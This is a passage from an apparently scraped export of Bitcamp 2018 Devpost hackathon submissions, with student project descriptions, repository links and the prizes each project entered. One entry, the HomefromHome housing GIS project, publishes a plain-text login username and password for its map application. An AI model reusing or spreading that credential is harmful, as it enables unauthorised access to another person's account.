Vacation planner, given your budget, dates and people travelling. Plans travel, food, places to visit all under the specified budget. 

**
",https://github.com/aduggirala28/TravelBud,Most Unique Hack - 1517 Fund,No,,,
Hackathon Scrapes,http://bitcamp2018.devpost.com/submissions/92498-hackathon-scrapes,"Inspiration

Our Team is made up of 4 Stony Brook students interested in hackathons. We have noticed the obvious lack of student-run hackathons on our campus. The history of student-run hackathons at Stony Brook has been something not as successful as most of us students would like it to be. In a pursuit to learn and understand more about how students/hacakthon enthusiasts can create long lasting hackathons, we have decided to visualize the history of hackathons in the past few years and relate it to geo-location, and to analyze.

What it does


Visualize Trends across Hackathons by MLH
Provide different features including reward money and number of hacker submissions
Expose the Data we scrapped via AWS


How I built it

We implemented web scraping to gather data about hackathons and used esri among other ways to display, visualize, and analyze the data we collected about hackathons. 

Challenges I ran into

The Esri API was difficult to get used to.
There is not a lot of data out there about hackathon that is easily accessible - we relied on web scraping in order to get the data we needed.

Accomplishments that I'm proud of

We scraped a lot of data off mlh.io and devpost.

What I learned

Web Scraping
Data Visualization
Amazon AWS

What's next for Hackathon Scrapes


Measure success of a hackathon (a start at creating a possible quantifier)
If we are able to get more data about hackathons, i.e. how many hackers attended
Different esri feature layers for more analysis
Integrate more non-MLH hackathons into the mix
Develop a better API to help share hackathon data for other users to use

",,"Best Hack with Esri APIs and SDKs - Esri, Best Use of AWS - Amazon Web Services, Best Hack (be passionate) - Facebook, Most Unique Hack - 1517 Fund",No,jastworld,jkunzmann41,
Beep Me,http://bitcamp2018.devpost.com/submissions/92499-beep-me,"Inspiration

Philippines, our culture, how can we as students make an impact with the use of technology in a 3rd world country

What it does

Real-time GPS tracking of Jeepneys on the move. Drivers can mark destinations where customers will be dropped off. Users can see future drop off points for each Jeepney in the area. 

How we built it

Planning steps of execution and design was first done on paper. Using Google Map's Android API along with the Firebase API, we developed an Android application. 
that shares location information between various users

Challenges we ran into


Embedding Google Map's API in our Android application and manipulating it to what we needed


Accomplishments that we're proud of


Generating a viable idea that fixes a serious problem in many third world countries.
Knowing that this small solution can lead to a big and positive impact to millions of civilians in the Philippines. 


What we learned


We learned a few things about how to implement Google API's into Android Applications and more about GPS Technologies. However, while researching topics we learned a lot about the inner turmoils that people face throughout the Philippines.


What's next for Beep Me


using data mined through our application to be used in improving other public modes of transportation. 
A more descriptive interface for Drivers and Users.

",,"Best Hack (be passionate) - Facebook, Best Accessibility Hack - Microsoft",No,,,
Banana Market,http://bitcamp2018.devpost.com/submissions/92500-banana-market,"Inspiration

Have you ever lost hundreds or thousands of dollars to the stock market?  Well, unfortunately we have.  Our group has spent countless dollars, hoping, and sadly failing in crypto currencies and stocks.  It would have been nice to receive some simple easy way to experiment with them before delving in.  This is where the banana market comes into play...  Since everyone is either on a computer or phone these days we have developed our application for both.  We hope this simple application serves as a tool to teach young children and teenagers (or anyone just starting out) of the dangers or beauty of the market.

What it does

The game starts off on Sunday, day one.  It provides 1 week, Sunday to Saturday, for a user to gain as much money as they can through buying and selling bananas.  Each day, the value of the bananas may suddenly rise or fall, just like how the stock market is sometimes very un-predictable.  On the Java version, different scenarios may occur causing the price of the Bananas to change.  At the start of every game, you are given $10 to start and a random amount of bananas already in possession (those old stocks your grandparents may have given to you when you were younger).  You must use proper judgement to know when to buy, sell, or hold your bananas.  Good Luck!

How we built it

We created one application in Eclipse using Java.  Using JFrames and JApplets we have the user play our game.  Starting out with the title screen after hitting enter, instructions pop up, then the user may play the game.  A random value is assigned to the bananas to start.  The user must select using a drop down menu or slider, the amount of bananas they want to sell or buy.  They start out with $10 and can only buy or sell using the amount they have in their wallet.  A random amount of bananas is assigned to start too.  Our second version of the game is made in XCode for IOS, capable of running on an IOS device.  It is a simpler version of the game that lasts longer, going 60 days, to really test a the user's abilities.

Challenges we ran into

Our first challenge was picking an idea and sticking with it.  We had multiple great ideas this weekend but kept getting stuck and realizing we were delving into unknown areas.  We hoped to combine our best skills with something new.  Java w IOS was the perfect combo. In Java, we had trouble refreshing the JPanel.  Since we did a calendar week, 7 days, each day we needed to refresh the JPanel with new information after the user had finished each day.  We also struggled with minor logical errors, selling more bananas then owned or not enough funds to purchase intended bananas.  We had never actually made an app on IOS before either.  We spent many hours figuring out how to setup an app on XCode and get it running.  

Accomplishments that we are proud of

We were very proud just to finish the original game in Eclipse.  The Java version took a while to finish and to remake the whole game with only using the logic in IOS was a great challenge. At first, we had hoped to put this on a web domain and allow anyone on the web to play our game.  We realized it would be more fun and different to make an app.  So after finishing the first version of the game and receiving some feedback we decided to make an app version geared more for the competitive side and higher end users.  It wasn't easy re-making the whole game again (but at least we had all of the logic already figured out). This was our first major hackathon and we struggled with many ideas.  We are so proud, happy, and tired (pulling an all nighter is always taxing), but amazed and what we accomplished.  

What we learned

We learned that persistence and patience is key and always update your applications before arriving because you never know how fast the wifi may be.  Throughout, our progress we learned how to create an IOS app in XCode and delve deeper into Java JPanels. 

What's next for our Banana Market

The java version of the game is great for kids and can be used as a great teaching tool.  The IOS version we hope to actually publish.  It needs to be spruced up a little bit and needs some funds for Apple's Costs but it can definitely be put on the store.  Since this is our first ever app we hope to see it there soon.
",https://github.com/zactham/FruitGamblingJavaApp,"Best Designed Investor Education Product - Finra, Best Financial Hack - Capital One",,aponnama,,
Impulse,http://bitcamp2018.devpost.com/submissions/92501-impulse,"Impulse

Impulse is a platform that mitigates impulsive spending and brings consciousness to consumerism. 
Note: The chrome extension's repo can be found here. The web app's repo can be found here



The Team: 

Michael Weinberger: The Frontend Wizard 
Benyam Ephrem: The Mongod (aka the backend guy) 
Richard Wang: Mr. Versatile (the man does everything) 

School Year: All Freshman @ University of Maryland (class of 2021) 



The Event: 

BitCamp 2018

Challenges Entered: 

Best Financial Hack - Capital One 
Best Use of MongoDB Stitch - MongoDB

The Mission: 

Bring Consciousness To Consumerism.

The Idea/Problem



Online one-click purchases often lead to buyers making impulse purchases that are unnecessary or that they may later regret. Our goal is to make buyers more aware and allow them to see how much they can save with conscious spending. We also give users the ability to compare their justifications for purchasing a product against how they feel about the purchase present day. Our goal is to mitigate a user's unconscious spending habits for a more fiscally responsible life.

The Solution



Create an application that stops a buyer in the online purchasing process and requires them to answer a simple but important question. ""Why Are You Buying This?"" The user must enter up to a certain threshold of characters before they may continue on with the purchase process. BUT, if they stop mid-typing and decide to ditch the purchase they may click a button that says ""This Is An Impulse Purchase"" and abandon the purchase. Either way, the decision is tracked so that the user may later reflect on how many impulses they stopped and how many items they really needed and therefore bought anyway.

Even if the user catches very few impulses...that is still an improvement. The goal is to introduce a gap of thinking. A gap in which a user ponders their consumption habits and really thinks about what they want out of what they buy with their hard earned money.

Initial Execution:



This is a large idea so it needs to be narrowed down. Let's narrow it now to this: 

Create an simple web portal for a user to sign up and view their dashboard that holds their consumption data and account settings. We will also need to create a chrome web extension so that we can execute actions on the DOM for stopping purchases and injecting our pop-up html, etc.

The initial version is a success if we can: 
1.) Stop a user before purchasing and require them to provide a quick and painless justification for the purchase 
2.) Collect that behavioral data and process it 
3.) Present that data to the user so that they can learn about how they spend and where they can improve 

Screenshots:



Before we get into the technical explanation (to scare you away) of how this project was created, what is good about it, what is technically unstable about it, etc. We will look at some pretty screenshots:

Web Portal



The first thing we had to design was the main website. We need to implement user authentication, user authorization and data analytics. This site would be the central hub of impluse, containg a dashboard that generated analytics for each user based on their activity. This is what it looks like:



Chrome Extension

We also had to create a chrome extension that had two main components to it as well. The chrome extension needs a modal that acted as a middleman between the consumer and the ecommerce site. We wanted to pause the user's activity, and help them really think about what actions they were about to take. We also had to create the chrome extension pop up section that allow a user to login (so their information could be stored and pushed to the database). 

Here is what the modal looks like:



Here is what the extension popup looks like:





The Technical Explanation



So now I will be going through the project thoroughly and I will explain each component and how it works extensively. Let us keep in mind there is nothing ground breaking going on here. Only simple CRUD operations and the storing + moving of data and making it meaningful to the user at the end of the day. Despite this simplicity, we believe the project delivers on its intended goal and holds promise for expansion later on.

The hackathon is a very rushed and intense process so yes...the code isn't perfect. Much is repeated. Much could be refactored into modular functions. Some variables could be extracted into a file with global scope. And on and on and on...either way we tried our best to hit the deliverables and have a working application with decent structure.

I will be walking through the components and just be looking at the code and explain what is happening as I go.

The Web Portal

The web portal runs on a Node.js and uses Express for serving static assets and managing endpoints that the chrome extension and web portal both use for access. We create a connection to the remote mongo database, partition off session data into its own data store so that it doesn't take up server RAM using connect-mongo, configure global middleware, add error handlers, and start the server. We also extracted all endpoints into their own routes file to make things easier to work with.



Challenge #1:

When designing the endpoints we had to decide if the Node server would just heavily serve the web portal (pulling db data, passing it in the model to the view, rendering the view) or be more system oriented (serve as a RESTful API that served JSON to authenticated users and both the extension and web portal would send requests to it for the data they need).

In short, we kind of did both just to get things working and up and running. It was hard to decide. So we started out with the former and later when designing the chrome extension (which we did 2nd) we realized that the latter was a better solution to avoid repeated code. The key here is that we know about this and kept in mind to make no operations too tightly coupled so later changes can be made easily.

Anyway, yes, so we have basic routes for rendering pages. We also have custom middleware that runs on the '/dashboard', '/sign-in', and 'sign-up' pages to ensure that: 

1.) If a user is signed in they don't need to sign-up or sign-in. They can be redirected to the dashboard if they hit that endpoint. 
2.) If they aren't signed in then they can't see the dashboard. Send them to the sign-in page. 

For sign-up and authentication we would simple get the user to sign up with email and password. The password is hashed in a pre-save hook (hook that runs before the document is saved) with 13 rounds of Bcrypt (which takes about 1 second to make a pretty secure hash) and saved to the database. Upon signup the unique value on the mongo document '_id' is used to create a session cookie that is checked for to ensure authentication (middleware uses this global value). The 'userId' value is globally avaliable to all views for consumption via the res.locals object. For signing in we simply hash the password entered and compare it to what the database holds.



Challenge #2:

So for me (Ben) a challenge was working with MongoDB Atlas and deciding what the database schema would be. For previous projects I used services like mLab for MongoDB. I had to learn how to create a cluster, hook up the cluster to a Stitch Application, setting permissions, connecting to the cluster's shards and visualizing the db with RoboMongo...it was a pain because each component would have a different version of the MongoDB driver (between my terminal, the mongoose library, RoboMongo, etc.). But eventually I SSH'ed in and could ensure login worked, seed some documents with purchase data, and just view the database to work with it.

I kept the purchase data on the user document for simplicity but going back I might possibly reconsider that and move the purchase data into its own collection and map the documents to user documents. Then again it really depends on how much data we intend a user document to store and unnecessarily splitting the data into 2 separate but linked documents might just be overkill. It was just something that I had to mill over. Continuing on...yes, we also have the public folder that holds images, js, and stylesheets too.



Challenge #3:

For the frontend we had to decide between using Angular and EJS for dynamic templating. We just went with the lightweight solution of EJS since we would have a relitively simple dashboard with graphs and tables of course. I personally like Angular better since it is a more natural solution to dynamic web pages but EJS sufficed for our purposes.

Next we will talk about the Chrome Extension. This is the part that caused more of a problem since the whole team was pretty inexperienced in making chrome extensions and how the environment would behave. Here is a chart I made that describes this (as well as my whole existence spent programming):



The Chrome Extension

The Google Chrome Extension was...well a chrome extension. The whole team had little to 0 experience making a chrome extension but we do know javascript and html so we thought it'd be a breeze!! Well...it was actually a lot harder than we thought.



Challenge #4:

Contexts and sharing data. So the chrome extension has two components: the main dashboard that pops up when the extension icon is clicked (extension component) and the html that is injected into the webpage (webpage component). Here is the problem...each component runs in a totally isolated context...aka a variable name 'var1' set to 1 in the webpage component does not exist in the extension component's context.

Since it is a separate context...there is literally another whole console for the extension component on top of the actual webpage's console. It took Michael and I nearly an hour and half to realize this was the root of our problems when we were working on setting up login (on the extension component) and data just wouldn't move between the files. We searched google chrome documentation for nearly 2 hours and exhaustively went through 10+ Stack Overflow article attempts at solutions as well as the official Google Chrome Extension docs on cross-extension messaging found here.

Nothing worked. No code worked. It was really frustrating.

So call us crazy, call us naive developers...so be it...in the spirit of a hackathon we decided to get creative and hack/enginner our own (I think funny) solution to sharing data between the two isolated components. So what we basically knew is that each of these components could talk to the Node.js server and hence have access to the database.

Michael proposed that we create a Auth database collection and when a user sign's in on the chrome extension we map the client's id to the '_id' on the user's document that is retrieved from a successful sign-in. Then when the webpage component wants to post data it can post it to the correct user id that is logged in by asking an auth endpoint (passing the client ip as a path param) what user id is authenticated on the client ip. When a user logs out or the extension closes the auth document is disposed of.

We both agreed that this was a very hacky solution to a problem that should be solved by some form of messaging inherent to the Google Chrome Extension API but decided to try it just for the challenge and the heck of it and it turned out that it worked pretty well.

But yes, it is not a stable way to auth a user (what if another user authenticates on the same ip...that'd be a one to many relationship which cannot be tolerated, what if a hacker knows the ip of someone logged in and can pull their id then manipulate another user's document? Then they can manipulate a document that is not theirs).

Either way with just a few more hours of researching this aspect of the application could be secured so it was just an experimental thing for us since this is not a production application or even near it.



Challenge #5:

Importing libraries and global variable scope naming problems. The biggest problem with this is how insidious it is. Javascript will hoist variables and functions leading to a clouding of the global namespace and if you are loose with your naming conventions it could come back to bite later.

You will not get a specific line that your code if failing on. You will only see something resolve as undefined and have no reason why and all you can do is move script files around and rename things until the problem resolves. This happened when we were loading the MongoDB Stitch minified js. It had variable names in it that when loaded after certain scripts led to the script being rendered useless and throwing an error internally.

We found that issue just from speculation and it turned out to solve the problem. On top of that when working with the Chrome Extension we could not make use of npm and require('') statements in the way we could easily import and manage libraries on our Node server. I don't personally know too much about importing libraries into js files so it was a challenge working with moving data around different files and working with libraries.



Challenge #6:

Getting MongoDB Stitch to work was definitely a challenge. There was a good amount of documentation reading and question asking that had to take place to get Stitch to work in our frontend but I don't attribute this to the platform as much as to our naiveness when it comes to working with frontend JS for a Google Chrome Extension.

For example we would hold the logged in user's ""_id"" in a global field as a string but it turns out the when executing a search against the ""_id"" field you must use an ObjectId object format of the string or else the search just won't come up with anything even if a document's ""_id"" field as a string matches the string being searched for.

We tried many libraries to convert the string into an ObjectId object but even after converting it still did not work for some reason so we just added another field to user documents that was a string representation of the ""_id"" field to search against.

So again, another tiny work around that can be solved easily with a more thought out patch that actually solves the core issue.



Future Updates




Supporting more than just Amazon. Expanding support to other serviecs where impulsive purchases may take place online.
Remove tiny bugs that are still in some places


Conclusion



Despite all of the technical challenges that we faced I am proud of my team and I. We had our arguments, we made our naive decisions, we insulted each other, we complimented each other, we had fun, and we created the idea that we had set out to create. There is nothing else like a hackathon environment where it is just pure focus at least for me. Just the human and the machine. A clean slate.

I used to believe that I knew everything but what I have realized overtime is that everyone has their great competencies. I am pretty competent with Node.js and MongoDB and have seen so many ways a server can crash that many bugs I just know instantly like it is common knowledge. But I'm weak at some aspects of frontend.

This is where Michael filled the gap. He is excellent at frontend and seeing where things can go wronng there and where solutions can be found. Richard is also very competent at this and is a critical thinker. These are things that I cannot do myself and can do much better working with individuals with said competence.

Basically, when we can find an intersection between these specials skills we have the recipe to create something elegant...something that matters. When team members support each other and see where one can excel and where they themselves fit in and contribute...it just creates an environment where everyone feels like they have a part and they matter just as much as the next person.

I could ask for nothing more than the teammates that I believe in and trust. And the trust that you give is as important as the trust you get in return.

And this is what I think we learned during Bitcamp. We learned to cooperate, we persevered through the insurmountable, grew as people, and had a good time doing what we have dedicated so much of our lives to.

Technology.

Built With


Node.js - Event-Driver Server-side Platform used
Express.js - Node.js web application framework used
MongoDB - MongoDB for Database
MongoDB Stitch - Backend as a Service for executing frontend db operations
RoboMongo - MongoDB GUI for Database Seeding, Cluster Visualization, & Testing
EJS - Dynamic Templating and Interpolation
Bootstrap - Bootstrap for Frontend
jQuery - Client-Side Document Object Model (DOM) Manipulations and Asynchronous JavaScript & XML (AJAX) Requests
Chart.js - Frontend chart library
npm - Package Manager
WebStorm - WebStorm IDE
Atom - Text Editor
VSCode - Text Editor


Credits


Flaticon - Icon assets
The guys at the MongoDB booth. They were super friendly and helped us with some issues. We <3 you.
Ben - You made a really sexy readme. Good job.

",https://github.com/bephrem1/impulse,"Best Designed Investor Education Product - Finra, Best Financial Hack - Capital One, Best Philanthropic Hack - Bloomberg, Best Use of MongoDB Stitch - MongoDB, Best Hack (be passionate) - Facebook, Most Unique Hack - 1517 Fund",No,bephrem1,,
ResQueue,http://bitcamp2018.devpost.com/submissions/92502-resqueue,"Inspiration

Both of us came into Bitcamp this year solo, but after realizing similarities in our ideas we decided to team up to build an app about preparing for natural disasters and extreme weather events.

What it does

There are two separate apps that are used together. The main app at its core is a weather app, retrieving weather data from a public api. Based on the data, there may be preparation tips so that users can prepare for more intense weather events. However, there is also an emergency mode that when activated, transmits GPS and bluetooth data in case of dangerous surroundings and a need for outside help. The second app is a rescue module that uses this GPS data to find hotspots of people in need. This enables rescuers to effectively and efficiently support the most people in the shortest amount of time.

How I built it

For the weather data, we used a public API called Dark Sky. Otherwise we used base Android and Java libraries to build each of the functions.

Challenges I ran into

There were constant challenges, the most notable of which was compatibility between versions of Android. It was difficult to decide which version we wanted to use, as there is a tradeoff between the number of potential users and the software functionality. There were also numerous instances in which we were stuck coding various methods due to our unfamiliarity with some aspects of the code that we were trying to accomplish.

Accomplishments that I'm proud of

I am happy that we accomplished all of our goals, successfully using the weather API, as well as utilizing various functions which take advantage of Android hardware. Every aspect of the project was difficult, so it is extremely gratifying to see it all come together.

What I learned

We became very familiar with programming in Java in Android Studio. Specifically, how to program using multiple activities, as well as how to utilize hardware like GPS and bluetooth receivers. We also gained experience with the Dark Sky weather API. It was interesting to experience first hand how multiple people can work on a project at once, and how it comes together at the end.

What's next for ResQueue

We hope to perfect the functionality that we weren't able to fully flush out. We would like to increase the efficiency of the code, as well as the readability and organization. This could definitely be useful to the public, and if not directly used, at least it could inspire others to create effective solutions to natural disasters.
",,"Improving Healthcare with Mobile Technologies - Credible Behavioral Health, Best Philanthropic Hack - Bloomberg, Best Hack for Aiding Natural Disaster Recovery Efforts - Booz Allen Hamilton",No,,,
pepsi obituary ,http://bitcamp2018.devpost.com/submissions/92503-pepsi-obituary,"Inspiration

i was riding a boosted board indoors. i accidentally sent the board shooting towards a table and ended up knocking a pepsi can over.

What it does

remember the fallen pepsi can.

How I built it

html/css.

Challenges I ran into

holding back my tears

Accomplishments that I'm proud of

remembering the fallen hero.

What I learned

not all heroes wear capes..

What's next for pepsi obituary

perpetual reminder of fallen pepsi cans all throughout the world
",,,,,,
Arkmo,http://bitcamp2018.devpost.com/submissions/92504-arkmo,"Inspiration

This december, when the price of bitcoin was skyrocketing, there was also an influx of people who don't understand how blockchains work to entering the cryptocurrency space. Then as the price started to fall, people seemingly lost what they had once seen in cryptocurrency, as if it's only purpose was an investment. The finance world is on the verge of a complete transformation, but the systems created by coders for coders are holding back the entire cryptocurrency ecosystem from being widely adopted.

The truth is that cryptocurrency has significant advantages over traditional fiat, but today there are so many unnecessary downsides and hurdles that it only makes sense to use a debit card in favor of cryptocurrency. Our inspiration for the project started by looking at where the cryptocurrency space is headed, and designing a more user friendly future.

More specifically we looked at the hurdles that discourage people from diving deeper into cryptocurrency, and designed a blockchain that can be applied on top of any cryptocurrency to patch user experience design flaws without requiring centralization.

We designed and implemented a request blockchain that allows users to create a transaction that has to be confirmed by the receiving party, where the transaction can be revoked before the receiving party confirms. This layer seemingly adds complexity, but it has parallels to how we physically interact with money, as well as prevents users from losing funds forever due to a typo.  This as well as an intuitive naming system allows for a much more approachable cryptocurrency experience 

Our blockchain was designed to be cryptocurrency agnostic so that any cryptocurrency could add a layer on top to  that any cryptocurrency can use it, leaving no excuse for leading cryptocurrencies to continue to be prohibitive to newcomers.
",https://github.com/CharlesBradshaw/arkmo-chain,"Decentralise Everything: Blockchain challenge - Ark, Most Futuristic Hack - Paypal, Best Use of AWS - Amazon Web Services, Best Financial Hack - Capital One, Best Hack (be passionate) - Facebook, Most Unique Hack - 1517 Fund",,,,
Market Vote,http://bitcamp2018.devpost.com/submissions/92505-market-vote,"Inspiration

x

What it does

How I built it

Challenges I ran into

Accomplishments that I'm proud of

What I learned

What's next for Market Vote
",,Decentralise Everything: Blockchain challenge - Ark,,,,
Finra Design Challenge,http://bitcamp2018.devpost.com/submissions/92506-finra-design-challenge,"Inspiration

What it does

Teach college students to do investments through simulated tutorials.

How we built it

Using hand sketches and Design tools

Challenges we ran into

Finra's Design Challenge

Accomplishments that we're proud of

What we learned

What's next for Finra Design Challenge
",https://drive.google.com/file/d/1XVYwgutwF2HsEHYP26EIDi3fg5yx7HtZ/view?usp=sharing,Best Designed Investor Education Product - Finra,,,,
Interactive Projection Mapping,http://bitcamp2018.devpost.com/submissions/92508-interactive-projection-mapping,"Inspiration

I've loved the idea of projection mapping forever, seeing giant buildings pulse and move like they were cg in real life. Iw wanted to try and recreate it 

What it does

How I built it

One trip to home depot, one projector, an arduino and a few piezo mics all with some clever software. 

Challenges I ran into

Software and hardware don't always like to talk to each other 

Accomplishments that I'm proud of

Honestly just pulling off a large significant hardware hack without much of a plan coming into this, it is one of the cooler looking things here in my opinion. 

What I learned

Pretty much everything, Processing was new to me, and kind of the design process with limited time and resources was an interesting challenge

What's next for Interactive Projection Mapping

Gotta make it bigger 
",,"Most Futuristic Hack - Paypal, Best Hack (be passionate) - Facebook","Yes, behind walmart's table but table B8",,,
BitByBit,http://bitcamp2018.devpost.com/submissions/92509-bitbybit,"Inspiration

Chrome's Dino game and Super Mario Bros.  

What it does

It's a platformer where the player acts as a marshmallow trying to dodge the flames.

How I built it

I coded a custom view class.  The entire project was built with only standard Java and Android SDK libraries, no external libraries were used.  

Challenges I ran into

Trying to add layers of animation while keeping the UI from locking up; I needed workarounds since Android imposes limitations on which threads can modify its Views.

Accomplishments that I'm proud of

(Semi-) Successfullying creating my first multi-screen/activity app after watching tutorials online.

What I learned

That vectors are super convenient, and much less annoying than arrays.  Also that I don't know collections syntax...

What's next for BitByBit

bug fixes���especially better stability
",https://github.com/fyang9297/Platform,Best Hack (be passionate) - Facebook,,,,
ChromaAR,http://bitcamp2018.devpost.com/submissions/92510-chromaar,"Inspiration

Five percent of people in the world suffer from some kind of colorblindness, including one of our close friends. Being colorblind introduces inconveniences into modern life, making some of the easiest tasks impossible. We realized that these inconveniences could be addressed with augmented reality. 

What it does

Chroma is a camera and augmented reality app that enables the colorblind to easily distinguish common color combinations: red-green and blue-yellow. Chroma applies distinct stripped patterns to these color pairs so that they can be easily be distinguished. Chroma also features AR mode and can be viewed through any virtual reality googles.

How we built it

Chroma is built on top of nekocode's ""CameraFilter"" application, which provides an API for applying an OpenGl filter over an Android camera preview. We then developed our own filters that isolate colors based on hue and then overlays the corresponding pattern. Then we combined these elements within Android Studio to create a coherent experience. Finally, we developed a secondary filter that is applied in conjunction with the color filters to create the an AR environment compatible with Google cardboard and Samsung Gear VR.

Challenges we ran into

We had initially decided to learn and use Flutter/Dart, so we spent most of the first 10 hours learning the basics of Flutter. However, we realized that Flutter currently has limitations and is severely lacking in documentation as it is still in development. At this time, we made the decision to switch to Android Studio and re-start development, which sent us back almost to square one. The other major challenge we ran into was in developing for OpenGl. We had no way to directly debug, and our distribution would crash if we used any integer types, severely limiting our efficiency. Nevertheless, we were able to get the filters functioning as we desired.

Accomplishments that we're proud of

We managed to create our own OpenGL filters. Neither of us knew OpenGL, C++, or Dart coming into the hackathon, and getting them working was one of our greatest challenges. However, we were able to learn them. We also discovered that our filters not only filter color, they have very good edge detection producing clean pattern mappings.

What we learned

We both came in with the intent of learning new software, which we accomplished. We both learned app development in Android Studio with and without Flutter. As mentioned above, we also learned the OpenGL api, C++, and Dart.

What's next for Chroma

Now that the base filter functionality is developed, there are several next steps. First, the AR mode can be improved with support for external cameras and further work in reducing distortion. Next, the filters can be improved by reducing noise detection as well as increasing edge fidelity. Development for Chroma will be continued on Google Play.
",https://play.google.com/store/apps/details?id=qian.ninja.chroma,"Using Virtual Reality Technology Design the Best Manufacturing Facility - Lockheed Martin, Improving Healthcare with Mobile Technologies - Credible Behavioral Health, Most Futuristic Hack - Paypal, Best Domain Name - Domain.com, Best Hack (be passionate) - Facebook, Best Accessibility Hack - Microsoft, Most Unique Hack - 1517 Fund","Yes, O4",,,
KruskalMadness,http://bitcamp2018.devpost.com/submissions/92511-kruskalmadness,"There comes a day when every young computer science major must face great challenges, and rise to the occasion of their newfound responsibility.  But few ever suspect that the day could come so soon.

Imagine.  You are a fresh computer science undergraduate, full of hope, and with a bright future ahead of you.  You sign up for this exciting class, CMSC 351, algorithms with Kruskal.  The man, the myth, the legend.  Kruskal.  

Class goes well, but one day, you get a homework assignment back.  A ""0"" is scrawled across the top.  You realize that you are out of your depth.  What's left to do?  A hole opens in the bottom of your stomach as you realize - you need the wisdom of the master himself. 

You walk gingerly up the third floor of A.V. Williams.  Halfway down the hallway, the foreboding door looms ahead of you.  Nearly twice as tall as you, it swings open ominously.

Ahead of you lies what can only be described as a war zone.  Papers and old bottles of sodas liter the ground.  And in the middle of it all, the lone survivor, Kruskal. 

He beacons you over, waiting as if to give you an important message.  With great trepidation, you begin your trek across the hallowed ground. 

May god have mercy on your soul.
",https://github.com/abrassel/KruskalMadness,"Best Hack (be passionate) - Facebook, Most Unique Hack - 1517 Fund",No,,,
Badger AR,http://bitcamp2018.devpost.com/submissions/92512-badger-ar,"Inspiration

We are participants in a augmented reality/virtual reality research program and wanted to gain experience using Unity to develop AR applications.

What it does

Users arrange image targets within a plane and are able to view 3D models based on their arrangements.

How we built it

Using Blender, we created pixelated image targets which we uploaded to a database in Vuforia. We also used Blender to 

Challenges we ran into

Developing the UI and Vuforia's limitations with regards to recognizing multiple instance of the same object.

Accomplishments that we're proud of

Creating a highly functional UI and creating all models and image targets from scratch.

What we learned

C#, Unity, Blender, Vuforia, etc.

What's next for Badger AR

Abstracting our UI so that users can import their own models and image targets for design.
",,"Most Futuristic Hack - Paypal, Best Hack (be passionate) - Facebook, Most Unique Hack - 1517 Fund",It does not,ishans1999,eschwe333,
Pres.io,http://bitcamp2018.devpost.com/submissions/92513-pres-io,"Inspiration

Plays a game of Pres between 4 different people

Using Atom IDE for js development

Using websockets

Creating a node.js game in less than 6 hours

How to use node.js for backend

Probably going to become a standalone website and maybe a mobile app
",http://127.0.0.1:1337/,Best Hack (be passionate) - Facebook,Tabel 13,,,
Everybody Hates Chris,http://bitcamp2018.devpost.com/submissions/92514-everybody-hates-chris,"Inspiration

Most demographic data, such as from the census, focuses focuses on objectively verifiable facts, but we think it is equally important to analyze trends in public perception. We picked the representative question ""how much does the nation hate Chris?"" and tried to analyze variations in public sentiment over time.

What it does

Plot several data sets related to the name ""Chris,"" in order to form a qualitative plus/minus ranking.

How we built it

We scraped data from several sources, including using several outside APIs and web scraping through Beautiful Soup, to create several geoJSON and CSV files. We uploaded this to Esri and used their visualization capacity to form an interactive frontend.

Challenges we ran into

Getting enough data! There are not very many Chris themed data sets out there.

Accomplishments that we're proud of

Taking a silly idea with much more serious implications, and successfully executing it from start to finish. 

What we learned

All of us gained experience designing a scalable implementation of our idea, and had to deal with data science issues such as data cleaning and verification for the first time.

What's next for Everyone Hates Chris

We want to scale this up into a more general sentiment analyzer - given a question, we wish to have a database of datasets from which we can automatically extract trends.
",https://nathan-kesavan.maps.arcgis.com/apps/TimeAware/index.html?appid=3748ef1daf7543658a2fc88d1ccaaec3,"Best Hack with Esri APIs and SDKs - Esri, Most Unique Hack - 1517 Fund",No,alimanan1525,09wakharet,
HomefromHome: Housing Market GIS,http://bitcamp2018.devpost.com/submissions/92515-homefromhome-housing-market-gis,"Login Information:

Username: navalmonga

Password: Bitcamprox1

Inspiration

The team has always wanted to tackle a big data set and make a useful visualization that others can use. With this in mind, we came across ArcGIS; an online mapping tool with multiple language integrations and rapid development. The team realized that there are not many online tools for comparing housing locations in conjunction with other factors such as crime rate, public education funding, and median/average housing value. Utilizing javascript and the powerful ArcGIS platform, we were able to implement a full stack solution to this problem within the span of 36 hours.

What it does

The visualization tool condenses and merges large data sets from calculations done on housing values, crime indexes, and educational funding to provide assistance to home/apartment/condo seekers in understanding the housing market. With housing comes a great deal of complex decisions on factors like location, schools, and mortgage rates. With this tool, we hope to ease the process further and provide an intuitive platform for buyers to feel confident in their choices.

How I built it

Utilizing the ArcGIS SDK we gathered three datasets from Esri's spatial database. These datasets served as the building blocks for our mapping application and are known as feature/tile layers to the platform. Through the use of the geographic data provided by these layers, the team quickly developed features to create, update, and hide attributes of the map's features based on user queries. The key feature of ArcGIS API was the consistency and lightweight nature of the data representation of their WebMap objects. This employed our approach towards developing the UI once and deploying to multiple platforms with ease. The ArcGIS Popup object contributed interactivity to our application by displaying spatial data on user actions. Lastly, the platforms Widget objects added powerful functionalities such as charting data, add Layer data, and selection of the WebMap's landscape/view.

Challenges I ran into

The first issue the team was faced with was data collection from a viable source. In this endeavor, we closely analyzed the sources of the data and the reliability of it representing a market as large as the United States housing industry. After a couple hours of experimenting with different resources, the team finalized on three datasets that were constructed in 2017.

The second issue of our development process had occurred in the stage of testing the application. The team was quick to cut features and take on new challenges along the way. We had dissected the API to its fullest and incorporated features into the solution that we felt would most strongly improve the end user experience.

Accomplishments that I'm proud of

The team is most proud of learning a new technology and exploring the possibilities it allowed us to create. This experience has taught us that together we are capable of creating technology that can change the world, but we must work hard and be consistent for that is the key to a great developer.

Secondly, we took this opportunity to expand our skills in the software development pipeline from initial proof-of-concept to unit and integration testing new features at a rapid rate.

What I learned

I have learned that software development can expand whole markets and industries. With emerging technologies, we are able to connect the world in a way that no one is left behind. Our skills and hard work will benefit the users of these technologies and is proof that the possibilities are endless.

What's next for HomefromHome: Housing Market GIS

We plan on expanding the web application to run with ReactNative. This will allow users of all platforms to experience the visualization and gain more insight on the housing market's current status.
",https://mongatech.maps.arcgis.com/apps/webappviewer/index.html?id=d387c2abff7e4668b9d2a834eeae2edd,"Best Hack with Esri APIs and SDKs - Esri, Housing insights ���in-between�۝ Datasets - Fannie Mae, Best Hack (be passionate) - Facebook",,,,
Stock Racer,http://bitcamp2018.devpost.com/submissions/92516-stock-racer,"How this idea came about

